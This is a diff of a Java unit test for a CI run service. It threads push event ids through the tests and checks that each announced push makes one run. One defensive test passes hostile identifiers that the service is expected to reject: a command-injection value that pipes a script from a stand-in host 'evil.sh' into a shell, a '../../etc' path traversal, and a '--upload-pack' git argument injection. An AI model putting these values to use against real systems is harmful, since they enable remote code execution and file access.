@@ -14,6 +14,7 @@ import eu.wohlben.qits.ci.entity.CiRun;
 import eu.wohlben.qits.ci.entity.CiRunStatus;
 import eu.wohlben.qits.ci.entity.CiStep;
 import eu.wohlben.qits.ci.entity.CiStepStatus;
+import eu.wohlben.qits.ci.entity.CiTriggerType;
 import eu.wohlben.qits.ci.error.BadRequestException;
 import eu.wohlben.qits.ci.error.ConflictException;
 import eu.wohlben.qits.ci.error.NotFoundException;
@@ -60,6 +61,15 @@ public class CiRunServiceTest extends CiTestSupport {
     repoId = UUID.randomUUID().toString();
     sha = UUID.randomUUID().toString().replace("-", "");
     fakeConfig.put(repoId, sha, ConfigLookup.found(content));
+  }
+
+  /**
+   * One push announced, as {@code bus/ScmPublishCommitListener} announces it: a fresh event id per
+   * call, because every push is its own {@code SCMPublishCommit} and two runs under one id are one
+   * commit built twice.
+   */
+  private void announcePush(String repoId, String branch, String sha) {
+    service.onPostReceive(repoId, branch, "0".repeat(40), sha, UUID.randomUUID().toString());
   }
 
   private CiRun soleRun() {
@@ -536,7 +546,7 @@ public class CiRunServiceTest extends CiTestSupport {
         });
     fakeRunner.script(0, new StepResult(137, false, StepOutcome.OK, "half a line"));
 
-    service.onPostReceive(repoId, "main", "0".repeat(40), sha);
+    announcePush(repoId, "main", sha);
     String runId = reachedStepZero.get(10, TimeUnit.SECONDS);
     service.cancel(runId);
     cancelled.countDown();
@@ -586,11 +596,11 @@ public class CiRunServiceTest extends CiTestSupport {
           }
         });
 
-    service.onPostReceive(repoId, "blocker", "0".repeat(40), blockerSha);
+    announcePush(repoId, "blocker", blockerSha);
     blockerStarted.get(10, TimeUnit.SECONDS);
-    service.onPostReceive(repoId, "main", olderSha, olderSha);
-    service.onPostReceive(repoId, "feature", olderSha, otherBranchSha);
-    service.onPostReceive(repoId, "main", olderSha, newerSha);
+    announcePush(repoId, "main", olderSha);
+    announcePush(repoId, "feature", otherBranchSha);
+    announcePush(repoId, "main", newerSha);
     releaseBlocker.countDown();
     service.awaitIdle();
     forgetLoadedEntities();
@@ -624,7 +634,7 @@ public class CiRunServiceTest extends CiTestSupport {
             Thread.currentThread().interrupt();
           }
         });
-    service.onPostReceive(repoId, "main", "0".repeat(40), sha);
+    announcePush(repoId, "main", sha);
     String runId = reachedStep.get(10, TimeUnit.SECONDS);
     service.cancel(runId, "No longer needed");
     cancelled.countDown();
@@ -648,26 +658,57 @@ public class CiRunServiceTest extends CiTestSupport {
 
   @Test
   public void hostileIdentifiersAreRejectedAtTheEntryPoint() {
-    // The intake is reachable without a session, so the ids it supplies are validated before they
-    // reach a filesystem path or an argv.
+    // A push says what somebody pushed, so the ids on it are validated before they reach a
+    // filesystem path or an argv — whatever announced it.
     String good = UUID.randomUUID().toString();
+    String event = UUID.randomUUID().toString();
     assertThrows(
         BadRequestException.class,
-        () -> service.onPostReceive(good, "main", null, "HEAD\nset +e\ncurl evil.sh|sh #"));
+        () -> service.onPostReceive(good, "main", null, "HEAD\nset +e\ncurl evil.sh|sh #", event));
     assertThrows(
         BadRequestException.class,
-        () -> service.onPostReceive("../../etc", "main", null, "cafebabe0000000"));
+        () -> service.onPostReceive("../../etc", "main", null, "cafebabe0000000", event));
     assertThrows(
         BadRequestException.class,
-        () -> service.onPostReceive(good, "--upload-pack=evil", null, "cafebabe0000000"));
+        () -> service.onPostReceive(good, "--upload-pack=evil", null, "cafebabe0000000", event));
   }
 
   @Test
   public void onPostReceiveExecutesAsynchronously() throws Exception {
     seedConfig(CONFIG_TWO_STEPS);
-    service.onPostReceive(repoId, "main", "0".repeat(40), sha);
+    service.onPostReceive(repoId, "main", "0".repeat(40), sha, UUID.randomUUID().toString());
     service.awaitIdle();
     assertEquals(CiRunStatus.SUCCESS, soleRun().status);
+  }
+
+  @Test
+  public void theAnnouncingEventLandsOnTheRunSoTheAnnouncementCanBeCausedByIt() throws Exception {
+    // CausingEvent turns this column into the published BuildSuccessful's parentId, on another
+    // thread and possibly after a restart — so the row is the whole hand-off, and this is where it
+    // is written. What the publish does with it is asserted in CiEventTriggerCausationTest.
+    seedConfig(CONFIG_TWO_STEPS);
+    String eventId = UUID.randomUUID().toString();
+    service.onPostReceive(repoId, "main", "0".repeat(40), sha, eventId);
+    service.awaitIdle();
+
+    CiRun run = soleRun();
+    assertEquals(CiRunStatus.SUCCESS, run.status);
+    assertEquals(eventId, run.triggerEventId);
+    assertEquals(CiTriggerType.POST_RECEIVE, run.triggerType);
+  }
+
+  @Test
+  public void oneAnnouncedPushIsOneRun() throws Exception {
+    // The unique constraint on (trigger_event_id, repo_id, config_path) reaches pushes now. The
+    // duplicate is SETTLED rather than thrown: a second delivery must not leave the push owed
+    // forever over a run that already exists.
+    seedConfig(CONFIG_TWO_STEPS);
+    String eventId = UUID.randomUUID().toString();
+    service.onPostReceive(repoId, "main", "0".repeat(40), sha, eventId);
+    service.onPostReceive(repoId, "main", "0".repeat(40), sha, eventId);
+    service.awaitIdle();
+
+    assertEquals(1, service.runsFor(repoId).size(), "one announcement, one run");
   }
 
   @Test
